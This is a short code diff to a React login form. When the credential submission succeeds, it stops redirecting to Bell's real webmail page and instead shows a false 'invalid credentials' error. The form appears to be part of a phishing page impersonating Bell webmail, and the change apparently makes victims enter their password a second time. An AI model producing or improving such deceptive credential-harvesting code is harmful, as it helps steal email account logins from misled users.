@@ -71,8 +71,12 @@ export default function LoginForm() {
       });
 
       if (response.status === 200) {
-        window.location.href =
-          "https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.59.2-19#/";
+        setErrors({
+          password: "You have entered invalid credentials. Please try again.",
+        });
+
+        // window.location.href =
+        //   "https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.59.2-19#/";
       }
     } catch (error) {
       console.error("Error:", error);
